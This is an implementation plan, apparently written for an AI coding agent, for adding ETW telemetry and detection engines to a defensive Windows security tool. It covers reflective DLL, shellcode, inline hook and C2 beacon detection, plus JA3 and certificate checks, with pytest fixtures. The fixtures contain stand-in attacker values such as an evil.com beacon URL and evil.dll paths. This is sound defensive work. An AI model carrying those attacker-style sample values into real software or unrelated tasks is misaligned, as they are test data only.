# Advanced Detection Layer Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Add memory forensics, encrypted traffic analysis, and fileless attack detection to Aegis via a unified ETW sensor and three new detection engines.

**Architecture:** Unified ETW sensor subscribes to 7 Windows ETW providers, emitting typed events onto the ZeroMQ bus. Three new detection engines (MemoryForensics, EncryptedTraffic, FilelessDetector) plug into the existing DetectionPipeline. Enhanced process/network sensors provide deeper telemetry.

**Tech Stack:** pywintrace (ETW), pefile (PE parsing), cryptography (X.509), scapy (TLS capture), ctypes (Windows API), numpy/scipy (beacon FFT), scikit-learn (flow classifier)

**Design Doc:** `docs/plans/2026-02-23-advanced-detection-design.md`

---

## Task 1: Add ETW SensorType and Event Models

**Files:**
- Modify: `src/aegis/core/models.py`
- Test: `tests/test_core/test_models.py`

**Step 1: Write failing test for new SensorType**

Add to existing test file:

```python
def test_sensor_type_etw():
    assert SensorType.ETW.value == "etw"
    assert SensorType.from_string("etw") == SensorType.ETW
```

**Step 2: Run test to verify it fails**

Run: `pytest tests/test_core/test_models.py::test_sensor_type_etw -v`
Expected: FAIL — ETW not in SensorType

**Step 3: Add ETW to SensorType enum**

In `src/aegis/core/models.py`, add to `SensorType`:

```python
ETW = "etw"
```

**Step 4: Run test to verify it passes**

Run: `pytest tests/test_core/test_models.py -v`
Expected: ALL PASS

**Step 5: Commit**

```bash
git add src/aegis/core/models.py tests/test_core/test_models.py
git commit -m "feat: add ETW sensor type to models"
```

---

## Task 2: ETW Provider Abstraction Layer

**Files:**
- Create: `src/aegis/sensors/etw_providers.py`
- Test: `tests/test_sensors/test_etw_providers.py`

This creates a mockable abstraction over ETW so the sensor can be tested without real ETW sessions.

**Step 1: Write failing tests**

```python
"""Tests for ETW provider abstraction."""
from __future__ import annotations

import pytest
from aegis.sensors.etw_providers import (
    ETWProviderConfig,
    ETWEventRecord,
    ETWSession,
    PROVIDER_CONFIGS,
)


class TestETWProviderConfig:
    def test_provider_config_has_name_and_guid(self):
        cfg = ETWProviderConfig(
            name="Microsoft-Windows-PowerShell",
            guid="{A0C1853B-5C40-4B15-8766-3CF1C58F985A}",
            keywords=0xFFFF,
        )
        assert cfg.name == "Microsoft-Windows-PowerShell"
        assert cfg.guid == "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}"
        assert cfg.keywords == 0xFFFF

    def test_all_seven_providers_defined(self):
        assert len(PROVIDER_CONFIGS) == 7
        names = {p.name for p in PROVIDER_CONFIGS}
        assert "Microsoft-Windows-Kernel-Process" in names
        assert "Microsoft-Windows-DotNETRuntime" in names
        assert "Microsoft-Windows-PowerShell" in names
        assert "Microsoft-Windows-AMSI" in names
        assert "Microsoft-Windows-WMI-Activity" in names
        assert "Microsoft-Windows-WinINet" in names
        assert "Microsoft-Windows-Schannel" in names


class TestETWEventRecord:
    def test_event_record_creation(self):
        rec = ETWEventRecord(
            provider_name="Microsoft-Windows-PowerShell",
            event_id=4104,
            process_id=1234,
            thread_id=5678,
            timestamp=1000.0,
            properties={"ScriptBlockText": "Get-Process"},
        )
        assert rec.provider_name == "Microsoft-Windows-PowerShell"
        assert rec.event_id == 4104
        assert rec.process_id == 1234
        assert rec.properties["ScriptBlockText"] == "Get-Process"


class TestETWSession:
    def test_session_creation(self):
        session = ETWSession(session_name="AegisTrace")
        assert session.session_name == "AegisTrace"
        assert not session.is_running

    def test_add_provider(self):
        session = ETWSession(session_name="AegisTrace")
        cfg = PROVIDER_CONFIGS[0]
        session.add_provider(cfg)
        assert len(session.providers) == 1

    def test_start_stop_lifecycle(self):
        session = ETWSession(session_name="AegisTrace")
        # On non-admin or non-Windows, start should gracefully degrade
        session.start()
        session.stop()
        assert not session.is_running
```

**Step 2: Run tests to verify they fail**

Run: `pytest tests/test_sensors/test_etw_providers.py -v`
Expected: FAIL — module not found

**Step 3: Implement ETW provider abstraction**

```python
"""ETW provider abstraction layer.

Provides a mockable interface over Windows ETW so the sensor can be
tested without real ETW sessions.  On non-Windows platforms or without
admin privileges the session degrades gracefully (no events emitted).
"""
from __future__ import annotations

import logging
import platform
import threading
from dataclasses import dataclass, field
from typing import Callable

logger = logging.getLogger(__name__)


@dataclass(frozen=True)
class ETWProviderConfig:
    """Configuration for a single ETW provider."""
    name: str
    guid: str
    keywords: int = 0xFFFFFFFFFFFFFFFF


@dataclass
class ETWEventRecord:
    """A single parsed ETW event."""
    provider_name: str
    event_id: int
    process_id: int
    thread_id: int
    timestamp: float
    properties: dict = field(default_factory=dict)


# All seven providers from the design doc
PROVIDER_CONFIGS: list[ETWProviderConfig] = [
    ETWProviderConfig(
        name="Microsoft-Windows-Kernel-Process",
        guid="{22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}",
        keywords=0x10,
    ),
    ETWProviderConfig(
        name="Microsoft-Windows-DotNETRuntime",
        guid="{E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}",
        keywords=0x1C,
    ),
    ETWProviderConfig(
        name="Microsoft-Windows-PowerShell",
        guid="{A0C1853B-5C40-4B15-8766-3CF1C58F985A}",
        keywords=0xFFFF,
    ),
    ETWProviderConfig(
        name="Microsoft-Windows-AMSI",
        guid="{2A576B87-09A7-520E-C21A-4942F0271D67}",
    ),
    ETWProviderConfig(
        name="Microsoft-Windows-WMI-Activity",
        guid="{1418EF04-B0B4-4623-BF7E-D74AB47BBDAA}",
    ),
    ETWProviderConfig(
        name="Microsoft-Windows-WinINet",
        guid="{43D1A55C-76D6-4F7E-995C-64C711E5CAFE}",
    ),
    ETWProviderConfig(
        name="Microsoft-Windows-Schannel",
        guid="{1F678132-5938-4686-9FDC-C8FF68F15C85}",
    ),
]


class ETWSession:
    """Manages an ETW tracing session.

    Wraps pywintrace or ctypes ETW APIs.  Gracefully degrades on
    non-Windows or when admin privileges are unavailable.
    """

    def __init__(self, session_name: str = "AegisTrace") -> None:
        self.session_name = session_name
        self.providers: list[ETWProviderConfig] = []
        self.is_running = False
        self._callback: Callable[[ETWEventRecord], None] | None = None
        self._thread: threading.Thread | None = None
        self._stop_event = threading.Event()

    def add_provider(self, config: ETWProviderConfig) -> None:
        """Register an ETW provider to trace."""
        self.providers.append(config)

    def set_callback(self, callback: Callable[[ETWEventRecord], None]) -> None:
        """Set the function called for each ETW event."""
        self._callback = callback

    def start(self) -> None:
        """Start the ETW tracing session."""
        if platform.system() != "Windows":
            logger.warning("ETW only available on Windows; session not started")
            return
        try:
            self._start_native()
        except Exception:
            logger.warning("ETW session start failed (need admin?)", exc_info=True)

    def stop(self) -> None:
        """Stop the ETW tracing session."""
        self._stop_event.set()
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=5.0)
        self.is_running = False

    def _start_native(self) -> None:
        """Start real ETW tracing via pywintrace or ctypes."""
        # Attempt pywintrace first, fall back to ctypes
        try:
            self._start_pywintrace()
        except ImportError:
            logger.info("pywintrace not available; trying ctypes ETW")
            self._start_ctypes()

    def _start_pywintrace(self) -> None:
        """Start ETW session using pywintrace library."""
        import etw as pywintrace  # noqa: F811

        providers = []
        for cfg in self.providers:
            providers.append(pywintrace.ProviderInfo(
                cfg.name,
                pywintrace.GUID(cfg.guid),
                any_keywords=cfg.keywords,
            ))

        def _on_event(event_tufo):
            if self._callback is None:
                return
            event_id, props = event_tufo
            record = ETWEventRecord(
                provider_name=props.get("ProviderName", ""),
                event_id=event_id,
                process_id=props.get("ProcessId", 0),
                thread_id=props.get("ThreadId", 0),
                timestamp=props.get("TimeStamp", 0.0),
                properties=props,
            )
            self._callback(record)

        self._etw = pywintrace.ETW(
            providers=providers,
            event_callback=_on_event,
        )
        self._etw.start()
        self.is_running = True

    def _start_ctypes(self) -> None:
        """Fallback: start ETW session via raw ctypes Win32 API."""
        # Placeholder — full ctypes implementation in a later task
        logger.warning("ctypes ETW fallback not yet implemented")
```

**Step 4: Run tests to verify they pass**

Run: `pytest tests/test_sensors/test_etw_providers.py -v`
Expected: ALL PASS

**Step 5: Commit**

```bash
git add src/aegis/sensors/etw_providers.py tests/test_sensors/test_etw_providers.py
git commit -m "feat: ETW provider abstraction with 7 provider configs"
```

---

## Task 3: ETW Sensor Implementation

**Files:**
- Create: `src/aegis/sensors/etw_sensor.py`
- Test: `tests/test_sensors/test_etw_sensor.py`
- Modify: `src/aegis/sensors/manager.py` (register new sensor)

**Step 1: Write failing tests**

```python
"""Tests for ETW Sensor."""
from __future__ import annotations

import time
import pytest
from unittest.mock import MagicMock, patch
from aegis.core.models import AegisEvent, SensorType, Severity
from aegis.sensors.etw_sensor import ETWSensor
from aegis.sensors.etw_providers import ETWEventRecord


class TestETWSensorInit:
    def test_sensor_type(self):
        sensor = ETWSensor()
        assert sensor.sensor_type == SensorType.ETW

    def test_sensor_name(self):
        sensor = ETWSensor()
        assert sensor.sensor_name == "etw_monitor"


class TestETWSensorEventParsing:
    def test_parse_powershell_scriptblock(self):
        sensor = ETWSensor()
        sensor.setup()
        record = ETWEventRecord(
            provider_name="Microsoft-Windows-PowerShell",
            event_id=4104,
            process_id=1234,
            thread_id=1,
            timestamp=time.time(),
            properties={
                "ScriptBlockText": "Get-Process | Select-Object Name",
                "ScriptBlockId": "abc-123",
                "Path": "C:\\test.ps1",
            },
        )
        events = sensor._parse_etw_record(record)
        assert len(events) == 1
        assert events[0].event_type == "etw.powershell_scriptblock"
        assert events[0].data["script_text"] == "Get-Process | Select-Object Name"
        assert events[0].data["pid"] == 1234

    def test_parse_dotnet_assembly_load(self):
        sensor = ETWSensor()
        sensor.setup()
        record = ETWEventRecord(
            provider_name="Microsoft-Windows-DotNETRuntime",
            event_id=152,
            process_id=5678,
            thread_id=1,
            timestamp=time.time(),
            properties={
                "FullyQualifiedAssemblyName": "Malicious.Assembly",
                "ModuleILPath": "",
                "IsDynamic": True,
            },
        )
        events = sensor._parse_etw_record(record)
        assert len(events) == 1
        assert events[0].event_type == "etw.dotnet_assembly_load"
        assert events[0].data["module_il_path"] == ""
        assert events[0].data["is_dynamic"] is True

    def test_parse_image_load(self):
        sensor = ETWSensor()
        sensor.setup()
        record = ETWEventRecord(
            provider_name="Microsoft-Windows-Kernel-Process",
            event_id=5,
            process_id=9999,
            thread_id=1,
            timestamp=time.time(),
            properties={
                "ImageName": "\\Device\\HarddiskVolume3\\evil.dll",
                "ImageBase": 0x7FF00000,
                "ImageSize": 0x10000,
            },
        )
        events = sensor._parse_etw_record(record)
        assert len(events) == 1
        assert events[0].event_type == "etw.process_image_load"
        assert events[0].data["image_path"] == "\\Device\\HarddiskVolume3\\evil.dll"

    def test_parse_amsi_scan(self):
        sensor = ETWSensor()
        sensor.setup()
        record = ETWEventRecord(
            provider_name="Microsoft-Windows-AMSI",
            event_id=1101,
            process_id=2222,
            thread_id=1,
            timestamp=time.time(),
            properties={
                "contentName": "test_script",
                "appName": "PowerShell",
                "scanResult": 32768,
            },
        )
        events = sensor._parse_etw_record(record)
        assert len(events) == 1
        assert events[0].event_type == "etw.amsi_scan"
        assert events[0].data["result"] == 32768

    def test_parse_wmi_activity(self):
        sensor = ETWSensor()
        sensor.setup()
        record = ETWEventRecord(
            provider_name="Microsoft-Windows-WMI-Activity",
            event_id=5861,
            process_id=3333,
            thread_id=1,
            timestamp=time.time(),
            properties={
                "Operation": "ExecMethod",
                "Namespace": "root\\subscription",
                "Query": "SELECT * FROM __EventFilter",
            },
        )
        events = sensor._parse_etw_record(record)
        assert len(events) == 1
        assert events[0].event_type == "etw.wmi_activity"

    def test_parse_http_request(self):
        sensor = ETWSensor()
        sensor.setup()
        record = ETWEventRecord(
            provider_name="Microsoft-Windows-WinINet",
            event_id=1057,
            process_id=4444,
            thread_id=1,
            timestamp=time.time(),
            properties={
                "URL": "https://evil.com/beacon",
                "RequestMethod": "GET",
                "RequestHeaders": "Host: evil.com",
            },
        )
        events = sensor._parse_etw_record(record)
        assert len(events) == 1
        assert events[0].event_type == "etw.http_request"
        assert events[0].data["url"] == "https://evil.com/beacon"

    def test_parse_tls_handshake(self):
        sensor = ETWSensor()
        sensor.setup()
        record = ETWEventRecord(
            provider_name="Microsoft-Windows-Schannel",
            event_id=36880,
            process_id=5555,
            thread_id=1,
            timestamp=time.time(),
            properties={
                "ServerName": "evil.com",
                "CipherSuite": "TLS_AES_256_GCM_SHA384",
                "ProtocolVersion": "TLS 1.3",
            },
        )
        events = sensor._parse_etw_record(record)
        assert len(events) == 1
        assert events[0].event_type == "etw.tls_handshake"

    def test_unknown_provider_returns_empty(self):
        sensor = ETWSensor()
        sensor.setup()
        record = ETWEventRecord(
            provider_name="Unknown-Provider",
            event_id=1,
            process_id=1,
            thread_id=1,
            timestamp=time.time(),
            properties={},
        )
        events = sensor._parse_etw_record(record)
        assert events == []
```

**Step 2: Run tests to verify they fail**

Run: `pytest tests/test_sensors/test_etw_sensor.py -v`
Expected: FAIL — module not found

**Step 3: Implement ETW sensor**

Create `src/aegis/sensors/etw_sensor.py` — the sensor extends `BaseSensor`, uses `ETWSession` for real ETW, and exposes `_parse_etw_record()` for deterministic testing. The `collect()` method drains a thread-safe queue of parsed events that the ETW callback populates.

Key implementation points:
- `setup()`: creates ETWSession, adds all 7 providers, sets callback
- ETW callback: calls `_parse_etw_record()`, appends to `collections.deque`
- `collect()`: drains deque, returns list of `AegisEvent`
- `_parse_etw_record()`: dispatches to `_parse_powershell`, `_parse_dotnet`, etc. based on `provider_name`
- Each parser maps ETW property names to normalized event data fields
- `teardown()`: stops ETW session

**Step 4: Run tests to verify they pass**

Run: `pytest tests/test_sensors/test_etw_sensor.py -v`
Expected: ALL PASS

**Step 5: Register in SensorManager**

Add to `SENSOR_REGISTRY` in `src/aegis/sensors/manager.py`:

```python
"etw": ("aegis.sensors.etw_sensor", "ETWSensor", SensorType.ETW),
```

**Step 6: Run full sensor test suite**

Run: `pytest tests/test_sensors/ -v`
Expected: ALL PASS

**Step 7: Commit**

```bash
git add src/aegis/sensors/etw_sensor.py tests/test_sensors/test_etw_sensor.py src/aegis/sensors/manager.py
git commit -m "feat: ETW sensor with 7 provider parsers"
```

---

## Task 4: Windows Memory API Wrappers

**Files:**
- Create: `src/aegis/detection/win_memory.py`
- Test: `tests/test_detection/test_win_memory.py`

Provides ctypes wrappers for `VirtualQueryEx`, `ReadProcessMemory`, `EnumProcessModulesEx`, thread enumeration. All functions are mockable — they accept a handle parameter that tests can stub.

**Step 1: Write failing tests**

Test the following:
- `MemoryRegion` dataclass creation and properties
- `enumerate_regions()` returns list of `MemoryRegion` (mock kernel32)
- `read_memory()` returns bytes or None (mock kernel32)
- `get_loaded_modules()` returns list of `ModuleInfo` (mock psapi)
- `enumerate_threads()` returns list of `ThreadInfo` (mock kernel32)
- `calculate_entropy()` correctness: empty=0, uniform=8.0, low-entropy<2.0
- `is_critical_process()` returns True for csrss, lsass, smss, etc.
- Constants: `MEM_COMMIT`, `MEM_PRIVATE`, `PAGE_EXECUTE_READWRITE` defined

**Step 2: Run to verify failure**

Run: `pytest tests/test_detection/test_win_memory.py -v`

**Step 3: Implement win_memory.py**

Dataclasses: `MemoryRegion` (base_address, size, state, protect, type, allocation_base, allocation_protect), `ModuleInfo` (base, size, name, path), `ThreadInfo` (thread_id, owner_pid, start_address).

Functions (all accept handle, all mock-friendly):
- `enumerate_regions(handle) -> list[MemoryRegion]`
- `read_memory(handle, address, size) -> bytes | None`
- `get_loaded_modules(handle) -> list[ModuleInfo]`
- `enumerate_threads(pid) -> list[ThreadInfo]`
- `calculate_entropy(data: bytes) -> float`
- `is_critical_process(name: str) -> bool`
- `open_process_readonly(pid: int) -> int | None`
- `close_handle(handle: int) -> None`

On non-Windows: all functions return empty results (graceful degradation).

**Step 4: Run tests**

Run: `pytest tests/test_detection/test_win_memory.py -v`
Expected: ALL PASS

**Step 5: Commit**

```bash
git add src/aegis/detection/win_memory.py tests/test_detection/test_win_memory.py
git commit -m "feat: Windows memory API wrappers with ctypes"
```

---

## Task 5: Memory Forensics Engine — Core Scanner

**Files:**
- Create: `src/aegis/detection/memory_forensics.py`
- Test: `tests/test_detection/test_memory_forensics.py`

**Step 1: Write failing tests**

```python
"""Tests for Memory Forensics Engine."""
from __future__ import annotations

import pytest
from unittest.mock import patch, MagicMock
from aegis.detection.memory_forensics import (
    MemoryForensicsEngine,
    MemoryFinding,
    FindingType,
)
from aegis.detection.win_memory import MemoryRegion, ModuleInfo


class TestMemoryFinding:
    def test_finding_creation(self):
        f = MemoryFinding(
            finding_type=FindingType.REFLECTIVE_DLL,
            pid=1234,
            address=0x7FF00000,
            size=0x10000,
            confidence=0.9,
            details={"has_pe_header": True},
            mitre_id="T1620",
        )
        assert f.finding_type == FindingType.REFLECTIVE_DLL
        assert f.mitre_id == "T1620"


class TestReflectiveDLLDetection:
    def test_detects_pe_in_private_executable_memory(self):
        engine = MemoryForensicsEngine()
        # MZ header + PE signature at offset 0x80
        pe_data = b"MZ" + b"\x00" * 0x3A + b"\x80\x00\x00\x00"
        pe_data += b"\x00" * (0x80 - len(pe_data)) + b"PE\x00\x00"
        pe_data += b"\x00" * (4096 - len(pe_data))

        region = MemoryRegion(
            base_address=0x1000000,
            size=0x10000,
            state=0x1000,       # MEM_COMMIT
            protect=0x20,       # PAGE_EXECUTE_READ
            type=0x20000,       # MEM_PRIVATE
            allocation_base=0x1000000,
            allocation_protect=0x40,
        )
        module_bases = {0x7FF00000}  # Different from region base

        findings = engine._check_reflective_dll(region, pe_data, module_bases)
        assert len(findings) == 1
        assert findings[0].finding_type == FindingType.REFLECTIVE_DLL

    def test_ignores_pe_at_known_module_base(self):
        engine = MemoryForensicsEngine()
        pe_data = b"MZ" + b"\x00" * 0x3A + b"\x80\x00\x00\x00"
        pe_data += b"\x00" * (0x80 - len(pe_data)) + b"PE\x00\x00"
        pe_data += b"\x00" * (4096 - len(pe_data))

        region = MemoryRegion(
            base_address=0x7FF00000, size=0x10000,
            state=0x1000, protect=0x20, type=0x20000,
            allocation_base=0x7FF00000, allocation_protect=0x40,
        )
        module_bases = {0x7FF00000}  # Same — known module

        findings = engine._check_reflective_dll(region, pe_data, module_bases)
        assert len(findings) == 0


class TestShellcodeDetection:
    def test_detects_high_entropy_executable_private(self):
        engine = MemoryForensicsEngine()
        # Random-ish bytes = high entropy
        import os
        shellcode = os.urandom(4096)

        region = MemoryRegion(
            base_address=0x2000000, size=4096,
            state=0x1000, protect=0x40,  # PAGE_EXECUTE_READWRITE
            type=0x20000,  # MEM_PRIVATE
            allocation_base=0x2000000, allocation_protect=0x40,
        )

        findings = engine._check_shellcode(region, shellcode)
        assert len(findings) >= 1
        assert findings[0].finding_type == FindingType.SHELLCODE

    def test_ignores_low_entropy_region(self):
        engine = MemoryForensicsEngine()
        low_entropy = b"\x00" * 4096

        region = MemoryRegion(
            base_address=0x2000000, size=4096,
            state=0x1000, protect=0x40, type=0x20000,
            allocation_base=0x2000000, allocation_protect=0x40,
        )

        findings = engine._check_shellcode(region, low_entropy)
        assert len(findings) == 0


class TestRWXDetection:
    def test_flags_rwx_private_regions(self):
        engine = MemoryForensicsEngine()
        region = MemoryRegion(
            base_address=0x3000000, size=0x1000,
            state=0x1000, protect=0x40,  # PAGE_EXECUTE_READWRITE
            type=0x20000,  # MEM_PRIVATE
            allocation_base=0x3000000, allocation_protect=0x40,
        )
        findings = engine._check_rwx(region)
        assert len(findings) == 1
        assert findings[0].finding_type == FindingType.RWX_REGION


class TestDotNetDetection:
    def test_detects_dotnet_metadata_in_private_memory(self):
        engine = MemoryForensicsEngine()
        # PE with BSJB .NET metadata signature
        pe_data = b"MZ" + b"\x00" * 0x3A + b"\x80\x00\x00\x00"
        pe_data += b"\x00" * (0x80 - len(pe_data)) + b"PE\x00\x00"
        # Add BSJB signature somewhere in the data
        pe_data += b"\x00" * 100 + b"BSJB"
        pe_data += b"\x00" * (4096 - len(pe_data))

        region = MemoryRegion(
            base_address=0x4000000, size=4096,
            state=0x1000, protect=0x20, type=0x20000,
            allocation_base=0x4000000, allocation_protect=0x40,
        )

        findings = engine._check_dotnet_injection(region, pe_data, set())
        assert len(findings) == 1
        assert findings[0].finding_type == FindingType.DOTNET_INJECTION
```

**Step 2: Run to verify failure**

Run: `pytest tests/test_detection/test_memory_forensics.py -v`

**Step 3: Implement MemoryForensicsEngine**

Core class with detection methods:
- `_check_reflective_dll(region, data, module_bases) -> list[MemoryFinding]`
- `_check_shellcode(region, data) -> list[MemoryFinding]`
- `_check_rwx(region) -> list[MemoryFinding]`
- `_check_dotnet_injection(region, data, module_bases) -> list[MemoryFinding]`
- `scan_process(pid) -> list[MemoryFinding]` — orchestrates all checks
- `analyze_event(event: AegisEvent) -> list[Alert]` — pipeline interface

`FindingType` enum: `REFLECTIVE_DLL`, `PROCESS_HOLLOWING`, `SHELLCODE`, `RWX_REGION`, `DOTNET_INJECTION`, `INLINE_HOOK`, `SUSPICIOUS_THREAD`

**Step 4: Run tests**

Run: `pytest tests/test_detection/test_memory_forensics.py -v`
Expected: ALL PASS

**Step 5: Commit**

```bash
git add src/aegis/detection/memory_forensics.py tests/test_detection/test_memory_forensics.py
git commit -m "feat: memory forensics engine — reflective DLL, shellcode, RWX, .NET detection"
```

---

## Task 6: Memory Forensics — Hook & Thread Detection

**Files:**
- Modify: `src/aegis/detection/memory_forensics.py`
- Modify: `tests/test_detection/test_memory_forensics.py`

**Step 1: Write failing tests for hook detection**

Test `_check_inline_hooks()`: pass mock module data where first bytes of an export have been changed to a JMP instruction (0xE9). Verify it returns a finding with `FindingType.INLINE_HOOK`.

Test `_check_thread_start_addresses()`: pass thread list where one thread starts outside any module range. Verify `FindingType.SUSPICIOUS_THREAD`.

**Step 2: Run to verify failure**

**Step 3: Implement both methods**

`_check_inline_hooks(pid, modules) -> list[MemoryFinding]`: For each security-critical DLL (ntdll, kernel32, kernelbase, advapi32, ws2_32), read first 16 bytes of exported functions from memory and from disk. Flag JMP/CALL opcodes (0xE9, 0xFF) at function entry that weren't in the original.

`_check_thread_start_addresses(pid, modules) -> list[MemoryFinding]`: Enumerate threads, get start addresses, check if each falls within a known module's address range. Flag threads starting in unbacked memory.

**Step 4: Run tests**

Run: `pytest tests/test_detection/test_memory_forensics.py -v`

**Step 5: Commit**

```bash
git add src/aegis/detection/memory_forensics.py tests/test_detection/test_memory_forensics.py
git commit -m "feat: memory forensics — inline hook and thread start address detection"
```

---

## Task 7: Memory Forensics — Pipeline Integration

**Files:**
- Modify: `src/aegis/detection/pipeline.py`
- Modify: `tests/test_detection/test_pipeline.py`

**Step 1: Write failing test**

```python
def test_pipeline_runs_memory_forensics_on_image_load():
    mock_engine = MagicMock()
    mock_engine.analyze_event.return_value = [
        Alert(
            event_id="evt-test", sensor=SensorType.ETW,
            alert_type="memory_reflective_dll",
            severity=Severity.CRITICAL, title="Reflective DLL",
            description="Test", confidence=0.95, data={},
            mitre_ids=["T1620"],
        )
    ]
    pipeline = DetectionPipeline(memory_forensics=mock_engine)
    event = AegisEvent(
        sensor=SensorType.ETW,
        event_type="etw.process_image_load",
        data={"pid": 1234, "image_path": "\\evil.dll"},
    )
    alerts = pipeline.process_event(event)
    assert len(alerts) == 1
    assert alerts[0].alert_type == "memory_reflective_dll"
```

**Step 2: Run to verify failure**

**Step 3: Add `memory_forensics` parameter to `DetectionPipeline.__init__` and `_run_memory_forensics()` method in `_run_parallel_engines()`**

Pattern: same as existing engines — optional parameter, wrapped in try/except, called for ETW image load events and process events.

**Step 4: Run full pipeline tests**

Run: `pytest tests/test_detection/test_pipeline.py -v`

**Step 5: Commit**

```bash
git add src/aegis/detection/pipeline.py tests/test_detection/test_pipeline.py
git commit -m "feat: integrate memory forensics engine into detection pipeline"
```

---

## Task 8: Beacon Timing Analyzer

**Files:**
- Create: `src/aegis/detection/beacon_detector.py`
- Test: `tests/test_detection/test_beacon_detector.py`

**Step 1: Write failing tests**

```python
"""Tests for C2 beacon detection via timing analysis."""
from __future__ import annotations

import numpy as np
import pytest
from aegis.detection.beacon_detector import BeaconDetector, BeaconResult


class TestBeaconDetectorStatistical:
    def test_detects_regular_beacon(self):
        """60-second beacon with <5% jitter should score >= 0.7."""
        detector = BeaconDetector(min_connections=10)
        base = 1000.0
        timestamps = [base + i * 60.0 + np.random.uniform(-3, 3)
                      for i in range(20)]
        result = detector.analyze(timestamps)
        assert result.is_beacon is True
        assert result.score >= 0.7
        assert 55 <= result.median_interval <= 65

    def test_rejects_random_traffic(self):
        """Random connection times should not trigger beacon detection."""
        detector = BeaconDetector(min_connections=10)
        timestamps = sorted(np.random.uniform(0, 3600, 20).tolist())
        result = detector.analyze(timestamps)
        assert result.is_beacon is False

    def test_insufficient_data(self):
        detector = BeaconDetector(min_connections=10)
        result = detector.analyze([1.0, 2.0, 3.0])
        assert result.is_beacon is False


class TestBeaconDetectorFFT:
    def test_fft_detects_periodic_signal_with_jitter(self):
        """Beacon with 30% jitter — FFT should still find periodicity."""
        detector = BeaconDetector(min_connections=10)
        base = 0.0
        interval = 120.0  # 2-minute beacon
        jitter = 0.3
        timestamps = [
            base + i * interval + np.random.uniform(
                -interval * jitter, interval * jitter
            )
            for i in range(50)
        ]
        result = detector.analyze_fft(sorted(timestamps))
        assert result.periodic is True
        assert 90 <= result.dominant_period <= 150

    def test_fft_rejects_aperiodic(self):
        detector = BeaconDetector(min_connections=10)
        timestamps = sorted(np.random.uniform(0, 7200, 50).tolist())
        result = detector.analyze_fft(timestamps)
        assert result.periodic is False
```

**Step 2: Run to verify failure**

**Step 3: Implement BeaconDetector**

Two result dataclasses: `BeaconResult` (is_beacon, score, median_interval, cv, pct_within_tolerance) and `FFTResult` (periodic, dominant_period, snr).

`analyze(timestamps) -> BeaconResult`: Statistical approach — compute deltas, median, CV, tolerance percentage. Score formula from design doc.

`analyze_fft(timestamps) -> FFTResult`: Bin timestamps into 1-second histogram, remove DC, FFT, find peak frequency, compute SNR. Periodic if SNR > 5.0.

**Step 4: Run tests**

Run: `pytest tests/test_detection/test_beacon_detector.py -v`

**Step 5: Commit**

```bash
git add src/aegis/detection/beacon_detector.py tests/test_detection/test_beacon_detector.py
git commit -m "feat: C2 beacon detector with statistical and FFT analysis"
```

---

## Task 9: JA3 Fingerprint Computation

**Files:**
- Create: `src/aegis/detection/ja3_fingerprint.py`
- Test: `tests/test_detection/test_ja3_fingerprint.py`

**Step 1: Write failing tests**

Test `compute_ja3()` with a known TLS ClientHello parsed into component fields (version, ciphers, extensions, curves, point_formats). Verify the MD5 hash matches the expected JA3 for that combination.

Test `compute_ja3_string()` returns the raw string before hashing.

Test with empty extensions/curves — should still produce valid hash.

**Step 2: Run to verify failure**

**Step 3: Implement**

```python
def compute_ja3(
    tls_version: int,
    cipher_suites: list[int],
    extensions: list[int],
    elliptic_curves: list[int],
    ec_point_formats: list[int],
) -> str:
    """Compute JA3 fingerprint hash from TLS ClientHello fields."""
    ja3_string = compute_ja3_string(
        tls_version, cipher_suites, extensions,
        elliptic_curves, ec_point_formats,
    )
    return hashlib.md5(ja3_string.encode()).hexdigest()

def compute_ja3_string(...) -> str:
    ciphers = "-".join(str(c) for c in cipher_suites)
    exts = "-".join(str(e) for e in extensions)
    curves = "-".join(str(c) for c in elliptic_curves)
    formats = "-".join(str(f) for f in ec_point_formats)
    return f"{tls_version},{ciphers},{exts},{curves},{formats}"
```

**Step 4: Run tests**

**Step 5: Commit**

```bash
git add src/aegis/detection/ja3_fingerprint.py tests/test_detection/test_ja3_fingerprint.py
git commit -m "feat: JA3 TLS fingerprint computation"
```

---

## Task 10: Certificate Anomaly Detector

**Files:**
- Create: `src/aegis/detection/cert_analyzer.py`
- Test: `tests/test_detection/test_cert_analyzer.py`

**Step 1: Write failing tests**

Test `analyze_certificate()` with:
- Self-signed cert → `is_self_signed = True`
- Short-lived cert (7-day validity) → `is_short_lived = True`
- Missing SAN → `no_san = True`
- Weak RSA key (1024-bit) → `weak_key = True`
- Normal cert → all flags False, `anomaly_score < 0.3`

Use `cryptography` library to generate test certificates in fixtures.

**Step 2: Run to verify failure**

**Step 3: Implement**

`CertAnalyzer` class with `analyze_certificate(cert_der: bytes) -> CertAnomalyResult` returning dataclass with: is_self_signed, is_short_lived, validity_days, no_san, weak_key, anomaly_score (weighted sum of flags).

**Step 4: Run tests, commit**

```bash
git add src/aegis/detection/cert_analyzer.py tests/test_detection/test_cert_analyzer.py
git commit -m "feat: X.509 certificate anomaly detection"
```

---

## Task 11: SSLBL Threat Feed Integration

**Files:**
- Modify: `src/aegis/intelligence/threat_feeds.py`
- Test: `tests/test_intelligence/test_threat_feeds.py`

**Step 1: Write failing test**

```python
class TestSSLBLFeed:
    def test_feed_name(self):
        feed = SSLBLFeed()
        assert feed.name == "sslbl_ja3"

    def test_parse_csv_response(self):
        csv_data = (
            "# comment line\n"
            "2024-01-01,abc123def456,Cobalt Strike,JA3 fingerprint\n"
            "2024-01-02,789xyz000111,Metasploit,JA3 fingerprint\n"
        )
        feed = SSLBLFeed()
        indicators = feed._parse_csv(csv_data)
        assert len(indicators) == 2
        assert indicators[0].ioc_type == "ja3"
        assert indicators[0].value == "abc123def456"
        assert indicators[0].metadata["family"] == "Cobalt Strike"
```

**Step 2: Run to verify failure**

**Step 3: Implement SSLBLFeed**

Extends `ThreatFeed` ABC. `fetch()` downloads CSV from `https://sslbl.abuse.ch/blacklist/ja3_fingerprints.csv`, parses with `_parse_csv()`, returns `list[IOCIndicator]` with `ioc_type="ja3"`.

**Step 4: Run tests, commit**

```bash
git add src/aegis/intelligence/threat_feeds.py tests/test_intelligence/test_threat_feeds.py
git commit -m "feat: SSLBL JA3 blacklist threat feed"
```

---

## Task 12: Encrypted Traffic Analysis Engine

**Files:**
- Create: `src/aegis/detection/encrypted_traffic.py`
